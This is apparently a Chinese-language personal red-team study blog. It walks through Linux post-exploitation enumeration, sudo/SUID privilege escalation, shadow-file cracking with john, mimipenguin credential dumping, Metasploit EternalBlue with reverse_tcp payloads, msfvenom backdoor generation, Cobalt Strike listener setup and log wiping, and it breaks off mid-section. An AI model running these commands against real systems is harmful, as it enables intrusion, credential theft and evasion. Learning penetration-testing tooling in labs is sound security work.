<h3 id="有用的命令"><a href="#有用的命令" class="headerlink" title="有用的命令"></a>有用的命令</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">命令</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">find / -perm -4000 -type f</td>
<td style="text-align:left">查找 SUID 的文件</td>
</tr>
<tr>
<td style="text-align:left">find / -uid 0 -perm -4000 -type f</td>
<td style="text-align:left">查找 root 权限的 SUID 文件</td>
</tr>
<tr>
<td style="text-align:left">find / -perm -2 -type f</td>
<td style="text-align:left">找出可写的文件</td>
</tr>
<tr>
<td style="text-align:left">find / ! -path “<em>/proc/</em>“ -perm -2 -type f -print</td>
<td style="text-align:left">查找 /proc 以外的可写文件</td>
</tr>
<tr>
<td style="text-align:left">find / -perm -2 -type d</td>
<td style="text-align:left">找出可写目录</td>
</tr>
<tr>
<td style="text-align:left">find /home –name *.rhosts -print</td>
<td style="text-align:left">查找 rhosts 的配置文件</td>
</tr>
<tr>
<td style="text-align:left">find /home -iname *.plan -exec ls -la {} ; -exec cat {}</td>
<td style="text-align:left">查询文件并打印</td>
</tr>
<tr>
<td style="text-align:left">ls -ahlR /root/</td>
<td style="text-align:left">查看是否有权限列用户目录</td>
</tr>
<tr>
<td style="text-align:left">cat ~/.bash_history</td>
<td style="text-align:left">查看当前用户的历史记录</td>
</tr>
<tr>
<td style="text-align:left">ls -la ~/.*_history</td>
<td style="text-align:left">查看当前用户的各种历史记录</td>
</tr>
<tr>
<td style="text-align:left">ls -la ~/.ssh/</td>
<td style="text-align:left">查看用户 ssh 登录信息</td>
</tr>
<tr>
<td style="text-align:left">ls -la /usr/sbin/in.*</td>
<td style="text-align:left">检查 inetd 服务的配置</td>
</tr>
<tr>
<td style="text-align:left">grep -l -i pass /var/log/*.log</td>
<td style="text-align:left">查询包含 pass 的日志并打印匹配到的行</td>
</tr>
<tr>
<td style="text-align:left">ls -la /etc/*.conf</td>
<td style="text-align:left">列出 /etc/ 下的所有配置文件</td>
</tr>
<tr>
<td style="text-align:left">lsof -i -n</td>
<td style="text-align:left">列出打开的文件</td>
</tr>
<tr>
<td style="text-align:left">head /var/mail/root</td>
<td style="text-align:left">答应 /var/mail/root 的开头</td>
</tr>
</tbody>
</table>
</div>
<h3 id="服务信息"><a href="#服务信息" class="headerlink" title="服务信息"></a>服务信息</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">命令</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">ps aux</td>
<td style="text-align:left">查看进程信息</td>
</tr>
<tr>
<td style="text-align:left">cat /etc/inetd.conf</td>
<td style="text-align:left">由 inetd 管理的服务列表</td>
</tr>
<tr>
<td style="text-align:left">cat /etc/xinetd.conf</td>
<td style="text-align:left">由 xinetd 管理的服务列表</td>
</tr>
<tr>
<td style="text-align:left">cat /etc/exports</td>
<td style="text-align:left">nfs 服务器的配置</td>
</tr>
</tbody>
</table>
</div>
<h3 id="作业和任务"><a href="#作业和任务" class="headerlink" title="作业和任务"></a>作业和任务</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">命令</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">crontab -l -u %username%</td>
<td style="text-align:left">显示指定用户的计划作业（需要 root 权限）</td>
</tr>
<tr>
<td style="text-align:left">ls -la /etc/cron*</td>
<td style="text-align:left">计划任务</td>
</tr>
<tr>
<td style="text-align:left">top</td>
<td style="text-align:left">列出当前进程</td>
</tr>
</tbody>
</table>
</div>
<h3 id="网络、路由和通信"><a href="#网络、路由和通信" class="headerlink" title="网络、路由和通信"></a>网络、路由和通信</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">命令</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">/sbin/ifconfig -a</td>
<td style="text-align:left">列出网络接口信息</td>
</tr>
<tr>
<td style="text-align:left">cat /etc/network/interfaces</td>
<td style="text-align:left">列出网络接口信息</td>
</tr>
<tr>
<td style="text-align:left">arp -a</td>
<td style="text-align:left">查看系统 arp 表</td>
</tr>
<tr>
<td style="text-align:left">route</td>
<td style="text-align:left">打印如有信息</td>
</tr>
<tr>
<td style="text-align:left">cat /etc/resolv.conf</td>
<td style="text-align:left">查看 dns 配置信息</td>
</tr>
<tr>
<td style="text-align:left">netstat -an</td>
<td style="text-align:left">打印本地端口开放信息</td>
</tr>
<tr>
<td style="text-align:left">iptables -L</td>
<td style="text-align:left">列出 iptable 的配置规则</td>
</tr>
<tr>
<td style="text-align:left">cat /etc/services</td>
<td style="text-align:left">查看端口服务映射</td>
</tr>
</tbody>
</table>
</div>
<h3 id="软件信息"><a href="#软件信息" class="headerlink" title="软件信息"></a>软件信息</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">命令</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">dpkg -l</td>
<td style="text-align:left">软件安装（Debian）</td>
</tr>
<tr>
<td style="text-align:left">rpm -qa</td>
<td style="text-align:left">软件安装（Red Hat）</td>
</tr>
<tr>
<td style="text-align:left">sudo -V</td>
<td style="text-align:left">查看 sudo 的版本信息</td>
</tr>
<tr>
<td style="text-align:left">httpd -v</td>
<td style="text-align:left">查看 apache 的版本信息</td>
</tr>
<tr>
<td style="text-align:left">apache2 -v</td>
<td style="text-align:left">查看 apache 的版本信息</td>
</tr>
<tr>
<td style="text-align:left">apache2ctl (or apachectl) -M</td>
<td style="text-align:left">列出加载的 apache 模块</td>
</tr>
<tr>
<td style="text-align:left">mysql —version</td>
<td style="text-align:left">mysql 的版本信息</td>
</tr>
<tr>
<td style="text-align:left">psql -V</td>
<td style="text-align:left">Postgres 数据库的版本信息</td>
</tr>
<tr>
<td style="text-align:left">perl -v</td>
<td style="text-align:left">perl 的版本信息</td>
</tr>
<tr>
<td style="text-align:left">java -version</td>
<td style="text-align:left">java 的版本信息</td>
</tr>
<tr>
<td style="text-align:left">python —version</td>
<td style="text-align:left">python 的版本信息</td>
</tr>
<tr>
<td style="text-align:left">ruby -v</td>
<td style="text-align:left">ruby 的版本信息</td>
</tr>
<tr>
<td style="text-align:left">find / -name %program_name%</td>
<td style="text-align:left">查找有用的软件</td>
</tr>
<tr>
<td style="text-align:left">which %program_name%</td>
<td style="text-align:left">查找有用的软件</td>
</tr>
<tr>
<td style="text-align:left">cat /etc/apache2/envvars</td>
<td style="text-align:left">查看运行 apache 的帐号</td>
</tr>
</tbody>
</table>
</div>
<h3 id="linux搜集流程参考"><a href="#linux搜集流程参考" class="headerlink" title="linux搜集流程参考"></a>linux搜集流程参考</h3><p>来源：<code>江苏智慧安全可信技术研究院</code></p>
<h4 id="前期"><a href="#前期" class="headerlink" title="前期"></a>前期</h4><p>啥也不知道，就知道一个目标</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nmap</span><br><span class="line">	蛮多用法，找个参考手册</span><br><span class="line">masscan</span><br><span class="line">	Masscan 127.0.0.0&#x2F;24 -p443  # 单端口扫描</span><br><span class="line">	Masscan 127.0.0.0&#x2F;24 --top-ports 100 -rate 100000  # 快速扫描</span><br><span class="line">	Masscan 127.0.0.0&#x2F;24 --top-ports 100 --excludefile exclude.txt # 排除指定目标</span><br><span class="line">	masscan 127.0.0.0&#x2F;24 -p20,21,22,23,80,161,443,873,2181,3389,6379,7001,8000,8009,8080,9000,9009,9090,9200,9300,10000,50070 &gt; results.txt</span><br></pre></td></tr></table></figure>
<h4 id="中期"><a href="#中期" class="headerlink" title="中期"></a>中期</h4><p>已获得低权限机器控制权</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">摸清系统版本</span><br><span class="line">hostname                    # 查看服务器主机名命令</span><br><span class="line">uname -a  </span><br><span class="line">回显</span><br><span class="line">-Linux kali 5.14.0-kali4-amd64 #1 SMP Debian 5.14.16-1kali1 (2021-11-05) x86_64 GNU&#x2F;Linux</span><br><span class="line">查看内核版本</span><br><span class="line">uname -mrs</span><br><span class="line">rpm -q kernel （这个说我的kernel包没安装。。。）</span><br><span class="line">dmesg | grep Linux</span><br><span class="line">ls &#x2F;boot | grep vmlinuz-</span><br></pre></td></tr></table></figure>
<p>获得内核版本后，即可去搜索是否该版本下存在漏洞，比如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -w 系统版本</span><br></pre></td></tr></table></figure>
<p>若该版本不存在漏洞，则找系统信息为主，查看用户信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id</span><br><span class="line">whoami</span><br><span class="line">groups</span><br><span class="line">who</span><br></pre></td></tr></table></figure>
<p>比如suid文件或者sudo提权（DC靶场都有记录：suid文件这个稍微绕一点，通俗来说，它允许用户使用者以文件所有者的权限来执行文件；sudo提权也就是其他用户通过sudo短暂获取root的某个命令权限，比如<code>sudo vi</code>然后执行<code>:!/bin/bash</code>，皆可获得root权限的shell）</p>
<p>补充：已知的可以用来提权的Linux可执行文件有：<br>CopyNmap、Vim、find、Bash、More、Less、Nano、cp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">查找find命令，实在太多参数了，用到再查</span><br><span class="line">查找SUID文件</span><br><span class="line">find &#x2F; -perm -u&#x3D;s 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>
<p>查看当前用户执行哪些 sudo 命令无需密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
<p>提权方案： <a href="https://gtfobins.github.io/" target="_blank" rel="noopener">https://gtfobins.github.io/</a></p>
<p>牛的，这个网站</p>
<p>开机启动项作为比较关键的点，无论是红方还是蓝方都不会放过。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">chkconfig                   # 查看开机启动服务命令</span><br><span class="line">ls &#x2F;etc&#x2F;init.d              # 查看开机启动配置文件命令</span><br><span class="line">cat &#x2F;etc&#x2F;rc.local           # 查看 rc 启动文件</span><br><span class="line">crontab -l</span><br><span class="line">ls -alh &#x2F;var&#x2F;spool&#x2F;cron</span><br><span class="line">ls -al &#x2F;etc&#x2F; | grep cron</span><br><span class="line">ls -al &#x2F;etc&#x2F;cron*</span><br><span class="line">cat &#x2F;etc&#x2F;cron*</span><br><span class="line">cat &#x2F;etc&#x2F;at.allow</span><br><span class="line">cat &#x2F;etc&#x2F;at.deny</span><br><span class="line">cat &#x2F;etc&#x2F;cron.allow</span><br><span class="line">cat &#x2F;etc&#x2F;cron.deny</span><br><span class="line">cat &#x2F;etc&#x2F;crontab</span><br><span class="line">cat &#x2F;etc&#x2F;anacrontab</span><br><span class="line">cat &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root</span><br></pre></td></tr></table></figure>
<h4 id="后期"><a href="#后期" class="headerlink" title="后期"></a>后期</h4><p>成功提权，进行信息收集，寻找横向渗透机会</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查看进程，推测机器作用</span><br><span class="line">ps -aux                     # 列出所有进程以及相关信息命令</span><br><span class="line">ps -ef</span><br><span class="line">top                         # 总览系统全面信息命令，Ctrl + C 退出界面</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">安装了哪些程序？什么版本？是否正在运行？</span><br><span class="line">ls -alh &#x2F;usr&#x2F;bin&#x2F;</span><br><span class="line">ls -alh &#x2F;sbin&#x2F;</span><br><span class="line">dpkg -l</span><br><span class="line">rpm -qa</span><br><span class="line">ls -alh &#x2F;var&#x2F;cache&#x2F;apt&#x2F;archivesO</span><br><span class="line">ls -alh &#x2F;var&#x2F;cache&#x2F;yum&#x2F;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">在查看一些常见的服务配置文件</span><br><span class="line">cat &#x2F;etc&#x2F;syslog.conf</span><br><span class="line">cat &#x2F;etc&#x2F;chttp.conf</span><br><span class="line">cat &#x2F;etc&#x2F;lighttpd.conf</span><br><span class="line">cat &#x2F;etc&#x2F;cups&#x2F;cupsd.conf</span><br><span class="line">cat &#x2F;etc&#x2F;inetd.conf</span><br><span class="line">cat &#x2F;etc&#x2F;apache2&#x2F;apache2.conf</span><br><span class="line">cat &#x2F;etc&#x2F;my.conf</span><br><span class="line">cat &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">cat &#x2F;opt&#x2F;lampp&#x2F;etc&#x2F;httpd.conf</span><br><span class="line">ls -aRl &#x2F;etc&#x2F; | awk &#39;$1 ~ &#x2F;^.*r.*&#x2F;</span><br><span class="line">emm，反正我没有这些服务，都记录下来吧</span><br></pre></td></tr></table></figure>
<p>查看文件日志：<code>如果时间充足，看一看日志文件也是很好的选择，这里就不多阐述，在之后的蓝队篇中会介绍。作为最高权限用户，shadow文件不可不看，万一跑出几个密码，横向渗透的成功率就会大大提高，将passwd和shadow文件下载到kali中进行unshadow，随后john爆破hash</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir &#x2F;root&#x2F;.john</span><br><span class="line">cd &#x2F;root&#x2F;.john</span><br><span class="line">unshadow passwd.txt shadow.txt &gt; hash.txt</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">除了shadow意外也可以看一看其他敏感文件，比如数据库的配置、历史记录等</span><br><span class="line">cat &#x2F;var&#x2F;apache2&#x2F;config.inc</span><br><span class="line">cat &#x2F;var&#x2F;lib&#x2F;mysql&#x2F;mysql&#x2F;user.MYD</span><br><span class="line">cat &#x2F;root&#x2F;anaconda-ks.cfg</span><br><span class="line">cat ~&#x2F;.bash_history</span><br><span class="line">cat ~&#x2F;.nano_history</span><br><span class="line">cat ~&#x2F;.atftp_history</span><br><span class="line">cat ~&#x2F;.mysql_history</span><br><span class="line">cat ~&#x2F;.php_history</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">邮件也是一个关键点，某些场景下，可以发现非常敏感的信息。</span><br><span class="line">ls -alh &#x2F;var&#x2F;mail&#x2F;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">除了本机器上的信息还要为拿下内网的其他机器做准备，摸清网络拓扑是必须的。</span><br><span class="line">route</span><br><span class="line">ip route        # 显示核心路由表</span><br><span class="line">ip neigh        # 显示邻居表</span><br><span class="line">cat &#x2F;etc&#x2F;resolv.conf  # 查看DNS</span><br><span class="line">arp -e</span><br></pre></td></tr></table></figure>
<p>以上流程只有实践才可更深层次掌握。</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.xazlsec.com&#x2F;index.php&#x2F;archives&#x2F;146&#x2F;</span><br></pre></td></tr></table></figure>
<h2 id="msf、empire等工具简单用法"><a href="#msf、empire等工具简单用法" class="headerlink" title="msf、empire等工具简单用法"></a>msf、empire等工具简单用法</h2><p>上述工具都有接触，我也算是刚刚入门，真正接触信安红队知识也是在2021年的10月左右，希望加把劲，冲起来。</p>
<h3 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h3><p>metasploit下针对linux的信息收集一件模块</p>
<p>post模块，牛的来</p>
<h4 id="检查虚拟机配置"><a href="#检查虚拟机配置" class="headerlink" title="检查虚拟机配置"></a>检查虚拟机配置</h4><p><img src="https://s2.loli.net/2022/02/24/JwzSq2v3djG6tOQ.png" alt="image-20220224214259704"></p>
<h4 id="枚举配置"><a href="#枚举配置" class="headerlink" title="枚举配置"></a>枚举配置</h4><p>该<strong>enum_configs</strong>上普遍安装的应用程序和服务，如Apache，MySQL和桑巴，Sendmail的，等发现模块收集配置文件如果在默认路径中找到一个配置文件，该模块将认为是我们想要的文件。</p>
<p><img src="https://s2.loli.net/2022/02/24/SsleFOYPgRoZ4rG.png" alt="image-20220224214351122"></p>
<h4 id="枚举网络"><a href="#枚举网络" class="headerlink" title="枚举网络"></a>枚举网络</h4><p>所述<strong>enum_network</strong>从目标系统模块枚举网络信息的<strong>防火墙规则</strong>，接口，<strong>无线信息</strong>，<strong>打开和监听端口</strong>，活动的网络连接，<strong>DNS信息和SSH信息</strong>。</p>
<p><img src="https://s2.loli.net/2022/02/24/tPziAVwUH2NuOE9.png" alt="image-20220224214434925"></p>
<h4 id="枚举保护"><a href="#枚举保护" class="headerlink" title="枚举保护"></a>枚举保护</h4><p>该<strong>enum_protections</strong>模块试图找到某些安装的应用程序，可用于防止，或发现我们的攻击，这是通过查找特定的二进制文件，看看他们是否确实可执行文件。例如，如果我们能够将 ‘snort’ 作为命令运行，我们假设它是我们正在寻找的文件之一。该模块旨在涵盖各种防病毒、rootkit、IDS/IPS、防火墙和其他软件。</p>
<p><img src="https://s2.loli.net/2022/02/24/2QZIifmt1pMNqlg.png" alt="image-20220224214527410"></p>
<h4 id="枚举系统"><a href="#枚举系统" class="headerlink" title="枚举系统"></a>枚举系统</h4><p>该<strong>enum_system</strong>模块收集系统信息。它收集已安装的包、已安装的服务、挂载信息、用户列表、用户 bash 历史记录和 cron 作业</p>
<p><img src="https://s2.loli.net/2022/02/24/U7JWzbm5fQc1P9u.png" alt="image-20220224214725647"></p>
<h4 id="用户具体信息HISTORY"><a href="#用户具体信息HISTORY" class="headerlink" title="用户具体信息HISTORY"></a>用户具体信息HISTORY</h4><p>该<strong>enum_users_history</strong>模块收集用户的具体信息。用户列表、bash 历史、mysql 历史、vim 历史、lastlog 和 sudoers。</p>
<p><img src="https://s2.loli.net/2022/02/24/W2tNvZbMuQxPnIo.png" alt="image-20220224214748716"></p>
<h3 id="mimipenguin"><a href="#mimipenguin" class="headerlink" title="mimipenguin"></a>mimipenguin</h3><p>linux下抓取登录用户密码</p>
<p>windows下有Mimikatz，现在linux下有了mimipenguin</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;huntergregal&#x2F;mimipenguin.git</span><br><span class="line">cd mimipenguin</span><br><span class="line">.&#x2F;mimipenguin.sh</span><br></pre></td></tr></table></figure>
<p>很奇怪，我没抓出来我自己的密码哈哈，可能超过版本了，这个说是通过了kali的4.3.0，我都5.1多了，不想解决先</p>
<h3 id="CS"><a href="#CS" class="headerlink" title="CS"></a>CS</h3><h4 id="cs基础：配置teamserver"><a href="#cs基础：配置teamserver" class="headerlink" title="cs基础：配置teamserver"></a>cs基础：配置teamserver</h4><p>哦豁，这个我很需要</p>
<p>先从基础的来，插播一个后门生成的工具哈哈哈，我不知道该放去哪里，反正可以和cs联动，那就放在这里吧</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">进入msf: </span><br><span class="line">msfconsolesearch</span><br><span class="line">命令查找模块: </span><br><span class="line">search ms17-010use</span><br><span class="line">进入模块: </span><br><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue (search以后use 0)</span><br><span class="line">模块详细信息查看: </span><br><span class="line">use了以后info，没use 之前 info exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue</span><br><span class="line">设置攻击载荷: </span><br><span class="line">set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">查看模块需要的参数:</span><br><span class="line">options</span><br><span class="line">设置参数: </span><br><span class="line">set lhost 0.0.0.0(参数名似乎不区分大小写)</span><br><span class="line">攻击:</span><br><span class="line">run &#x2F; exploit 都可以meterpreter后渗透阶段</span><br></pre></td></tr></table></figure>
<h4 id="msf生成后门，不一定要用cs的生成，但是谁又能拒绝一个自动化生成后门呢"><a href="#msf生成后门，不一定要用cs的生成，但是谁又能拒绝一个自动化生成后门呢" class="headerlink" title="msf生成后门，不一定要用cs的生成，但是谁又能拒绝一个自动化生成后门呢"></a>msf生成后门，不一定要用cs的生成，但是谁又能拒绝一个自动化生成后门呢</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msfvenom</span><br><span class="line">  -a 系统架构</span><br><span class="line">  --platform 系统平台</span><br><span class="line">  -p 有效载荷</span><br><span class="line">  lhost&#x3D;攻击机IP </span><br><span class="line">  lport&#x3D;攻击机端口</span><br><span class="line">  -e 编码方式</span><br><span class="line">  -i 编码次数</span><br><span class="line">  -f 输出格式</span><br><span class="line">  -o 输出文件</span><br><span class="line">msfvenom -a x86 --platform windows -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.1.1 lport&#x3D;8888-i 3-e x86&#x2F;shikata_ga_nai -f exe -o payload.exe</span><br><span class="line">一般来说 -a可以不用，--platform也可以不用</span><br></pre></td></tr></table></figure>
<h4 id="一些命令"><a href="#一些命令" class="headerlink" title="一些命令"></a>一些命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">查看msfvenom支持的系统 msfvenom -l archs</span><br><span class="line">查看支持的系统平台：msfvenom -l plantforms</span><br><span class="line">列出payloads：msfvenom -l payloads</span><br><span class="line">列出所有的输出格式：msfvenom -l formats</span><br><span class="line">列出所有的加密方式：msfvenom -l encrypt</span><br><span class="line">列出所有的编码器：msfvenom -l encoders</span><br></pre></td></tr></table></figure>
<h4 id="常见生成格式"><a href="#常见生成格式" class="headerlink" title="常见生成格式"></a>常见生成格式</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">windows：</span><br><span class="line">msfvenom --platform windows -a x86 -p windows&#x2F;meterpreter&#x2F;reverse_tcp -i 3-ex86&#x2F;shikata_ga_nai -f exe -o payload.exe </span><br><span class="line"></span><br><span class="line">linux </span><br><span class="line">msfvenom --platform linux -a x86 -p linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp -f elf -o payload.elf</span><br><span class="line">........好多啊，可恶！</span><br><span class="line">不写了，下次直接看网址。。</span><br></pre></td></tr></table></figure>
<p>进入正题，CS！</p>
<p>不懂我的虚拟机怎么又被重置了，烦死了。。。又要重新装，装好了，哈哈，直接就是<code>chmod 777 teamserver</code>就好，再<code>./teamserver 服务器ip 密码</code></p>
<h4 id="cs文件介绍"><a href="#cs文件介绍" class="headerlink" title="cs文件介绍"></a>cs文件介绍</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">agscript：扩展应⽤的脚本 </span><br><span class="line">c2lint：⽤于检查profile的错误和异常 </span><br><span class="line">teamserver：服务器端启动程序，需要给权限777</span><br><span class="line">cobaltstrike.jar：CobaltStrike核⼼程序</span><br><span class="line">cobaltstrike.auth：⽤于客户端和服务器端认证的⽂件，客户端和服务端有⼀个⼀模⼀样的 </span><br><span class="line">cobaltstrike.store：秘钥证书存放⽂件</span><br><span class="line">客户端基本只需cobaltstrike.jar，cobaltstrike.auth，cobaltstrike.store这几个文件。&#x2F;&#x2F;但是我一般都全部导进去的，随便啦</span><br></pre></td></tr></table></figure>
<h4 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">我是没找到。。g</span><br><span class="line">data：⽤于保存当前TeamServer的⼀些数据 </span><br><span class="line">download：⽤于存放在⽬标机器下载的数据 </span><br><span class="line">upload：上传⽂件的⽬录 logs：⽇志⽂件，包括Web⽇志、Beacon⽇志、截图⽇志、下载⽇志、键盘记录⽇志等 </span><br><span class="line">third-party：第三⽅⼯具⽬录</span><br></pre></td></tr></table></figure>
<h4 id="cs清除日志"><a href="#cs清除日志" class="headerlink" title="cs清除日志"></a>cs清除日志</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">这个我倒是有，但是我真的很少用，我也没配置我的云服务器，很难受</span><br><span class="line">logs文件打包备份以后删除原文件夹。</span><br><span class="line"></span><br><span class="line">删除 ~&#x2F;.aggressor.prop 文件里的内容。</span><br><span class="line">	CS监听器和插件</span><br><span class="line">	主要记录监听器的各种payload和选项</span><br><span class="line">	加载插件时候的各种需要注意的问题</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/02/25/pHQiXm9CK2oe6Rv.png" alt="image-20220225195507337"></p>
<p>类似于cs的一些基本操作，cs都有文档的，这里就当作背诵记录一下</p>
<p><img src="https://s2.loli.net/2022/02/25/eoThPDFg6z4aqt1.png" alt="image-20220225200445412"></p>
<h4 id="最基本的就是创建监听器"><a href="#最基本的就是创建监听器" class="headerlink" title="最基本的就是创建监听器"></a>最基本的就是创建监听器</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">监听器-&gt; listeners</span><br><span class="line">CobaltStrike的内置监听器为Beacon，外置监听器为Foreign。CobaltStrike的Beacon支持异步通信和交互式通信。</span><br><span class="line">创建监听器的方式：</span><br><span class="line">Cobalt_Strike-&gt;Listeners-&gt;add</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">详细版</span><br><span class="line">listener</span><br><span class="line">name：为监听器名字，可任意</span><br><span class="line">payload：payload类型，建议HTTPS流量加密HTTP</span><br><span class="line">Hosts: shell反弹的主机，测试中也可以填CDN节点，我一般拿自己的kali，有点蠢</span><br><span class="line">HTTP Hosts(Stager): Stager的⻢请求下载payload的地址，默认也是shell反弹的主机地址</span><br><span 